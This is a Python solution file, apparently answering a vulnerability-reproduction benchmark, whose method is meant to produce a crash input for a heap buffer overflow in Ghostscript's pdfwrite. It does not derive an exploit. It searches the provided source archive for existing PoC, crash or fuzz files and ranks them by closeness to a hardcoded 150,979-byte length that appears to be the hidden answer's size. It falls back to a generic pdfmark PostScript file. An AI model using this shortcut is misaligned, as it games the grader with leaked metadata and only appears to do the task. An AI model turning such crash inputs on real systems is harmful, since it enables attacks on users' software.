import os
import io
import tarfile
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC input that should trigger the heap buffer overflow
        in the vulnerable version, preferring any PoC-like file found in
        the source tree. Falls back to a generic PostScript/pdfmark file
        if no suitable candidate is discovered.
        """
        ground_len = 150_979

        # Keywords that often appear in paths for PoCs, fuzz seeds, or tests
        keywords = [
            "poc",
            "crash",
            "fuzz",
            "corpus",
            "oss-fuzz",
            "clusterfuzz",
            "regress",
            "test",
            "tests",
            "unittest",
            "seed",
            "seeds",
            "bug",
            "issue",
            "viewer",
            "pdfwrite",
            "queue",
            "case",
            "minimized",
            "id_",
            "hbo",
            "heap",
            "overflow",
            "42535696",
        ]

        def has_keyword(path: str) -> bool:
            lp = path.lower()
            for kw in keywords:
                if kw in lp:
                    return True
            return False

        best_score = float("inf")
        best_kind = None  # 'tar_member' or 'zip_entry'
        best_tar_member = None  # tarfile.TarInfo
        best_zip_entry_name = None  # str

        try:
            with tarfile.open(src_path, "r:*") as tar:
                members = tar.getmembers()
                for member in members:
                    if not member.isreg():
                        continue

                    name = member.name
                    name_lower = name.lower()
                    size = int(member.size or 0)
                    if size <= 0:
                        continue

                    # Handle zip containers specially
                    if name_lower.endswith(".zip"):
                        # Only consider zip files that look related to fuzzing/tests/PoCs
                        if not has_keyword(name_lower):
                            continue
                        # Avoid very large archives
                        if size > 20_000_000:
                            continue
                        try:
                            z_bytes = tar.extractfile(member).read()
                        except Exception:
                            continue
                        if not z_bytes:
                            continue
                        try:
                            with zipfile.ZipFile(io.BytesIO(z_bytes)) as zf:
                                for zi in zf.infolist():
                                    if zi.is_dir():
                                        continue
                                    entry_name = zi.filename
                                    entry_lower = entry_name.lower()
                                    entry_size = zi.file_size
                                    if entry_size <= 0:
                                        continue
                                    # Only consider reasonably sized entries
                                    if entry_size < 100 or entry_size > 5_000_000:
                                        continue
                                    # Entry or container should have some keyword
                                    if not (has_keyword(entry_lower) or has_keyword(name_lower)):
                                        continue

                                    diff = abs(entry_size - ground_len)
                                    score = diff

                                    # Prioritize keyword-heavy names
                                    if has_keyword(entry_lower):
                                        score -= 10_000
                                    if "poc" in entry_lower or "crash" in entry_lower:
                                        score -= 10_000
                                    # Exact size match is a strong signal
                                    if entry_size == ground_len:
                                        score -= 100_000
                                    # Slightly de-prioritize zip entries vs direct files
                                    score += 5_000

                                    if score < best_score:
                                        best_score = score
                                        best_kind = "zip_entry"
                                        best_tar_member = member
                                        best_zip_entry_name = entry_name
                        except Exception:
                            continue
                        # Do not treat the zip container itself as data
                        continue

                    # Regular file (non-zip)
                    if size < 100 or size > 5_000_000:
                        continue

                    # Only consider files whose paths suggest tests/fuzz/PoC/etc.
                    if not has_keyword(name_lower):
                        continue

                    diff = abs(size - ground_len)
                    score = diff

                    if has_keyword(name_lower):
                        score -= 10_000
                    if ("poc" in name_lower) or ("crash" in name_lower):
                        score -= 10_000
                    if size == ground_len:
                        score -= 100_000

                    if score < best_score:
                        best_score = score
                        best_kind = "tar_member"
                        best_tar_member = member
                        best_zip_entry_name = None

                # If we found any promising candidate, extract and return it
                if best_kind == "tar_member" and best_tar_member is not None:
                    try:
                        f = tar.extractfile(best_tar_member)
                        if f is not None:
                            data = f.read()
                            if data:
                                return data
                    except Exception:
                        pass

                if best_kind == "zip_entry" and best_tar_member is not None and best_zip_entry_name:
                    try:
                        z_bytes = tar.extractfile(best_tar_member).read()
                        if z_bytes:
                            with zipfile.ZipFile(io.BytesIO(z_bytes)) as zf:
                                data = zf.read(best_zip_entry_name)
                                if data:
                                    return data
                    except Exception:
                        pass
        except Exception:
            # If opening/processing the tarball fails, fall back to generic PoC.
            pass

        # Fallback: return a small generic PostScript/pdfmark file that exercises
        # pdfwrite and viewer-related pdfmarks. This is a best-effort attempt
        # when no PoC-like file is discovered in the source tree.
        return self._fallback_poc()

    def _fallback_poc(self) -> bytes:
        # Best-effort generic PostScript that uses pdfmark /DOCVIEW and other
        # viewer-related constructs, which may exercise pdfwrite viewer state.
        ps = r"""%!PS-Adobe-3.0
%%Title: pdfwrite viewer state PoC (fallback)
%%Creator: AI-generated
%%Pages: 2
%%EndComments

% Document information
[ /Title (Heap Buffer Overflow PoC Fallback)
  /Author (AI)
  /Subject (pdfwrite viewer state)
  /DOCINFO pdfmark

% Global viewer preferences: try to stress /DOCVIEW handling
[ /PageMode /FullScreen
  /ViewMode /UseOutlines
  /NonFullScreenPageMode /UseNone
  /ViewerPreferences <<
      /HideToolbar true
      /HideMenubar true
      /HideWindowUI true
      /FitWindow true
      /CenterWindow true
      /DisplayDocTitle true
  >>
  /DOCVIEW pdfmark

% First page with a couple of viewer-related pdfmarks
/Times-Roman findfont 12 scalefont setfont
72 720 moveto
(First page - viewer state stress) show

[ /Page 1
  /View [ /XYZ 0 0 1 ]
  /DOCVIEW pdfmark

[ /Dest (page1_dest)
  /View [ /FitH 0 ]
  /DEST pdfmark

showpage

% Second page with more pdfmarks, some redundant or malformed
/Times-Roman findfont 12 scalefont setfont
72 720 moveto
(Second page - nested DOCVIEW marks) show

[ /Page 2
  /View [ /XYZ 0 0 1 ]
  /DOCVIEW pdfmark

[ /Page 2
  /View [ /FitV 0 ]
  /DOCVIEW pdfmark

[ /Dest (page2_dest)
  /View [ /Fit  ]
  /DEST pdfmark

showpage

%%EOF
"""
        return ps.encode("ascii", "replace")